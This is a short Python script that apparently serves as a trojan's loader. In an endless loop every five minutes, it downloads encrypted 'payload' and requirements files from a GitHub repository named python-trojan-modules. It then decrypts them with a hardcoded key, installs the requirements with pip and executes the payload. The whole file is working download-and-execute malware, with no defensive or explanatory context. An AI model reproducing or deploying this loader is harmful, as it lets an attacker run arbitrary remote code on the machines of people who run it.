import os

import requests as requests
import subprocess
import decryption
import time
import os

key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='
payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
requirements_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/requirements.txt.enc"

if not os.path.exists('payload'):
    os.makedirs('payload')
    print("Folder created successfully.")
else:
    print("Folder already exists.")

def run_payload():
    p = requests.get(payload_url, allow_redirects=True)
    open('payload/' + 'payload.py.enc', 'wb').write(p.content)
    r = requests.get(requirements_url, allow_redirects=True)
    open('payload/' + 'requirements.txt.enc', 'wb').write(r.content)

    decryption.decrypt_file('payload/' + 'payload.py.enc', key)
    decryption.decrypt_file('payload/' + 'requirements.txt.enc', key)

    subprocess.run(["pip", "install", "-r", 'payload/' + "requirements.txt"])
    subprocess.run(["python", 'payload/' + "payload.py"])


if __name__ == '__main__':
    while True:
        print("Running payload")
        run_payload()
        for i in range(0, 5):
            print("Sleeping for " + (5-i).__str__() + " minutes")
            time.sleep(60)
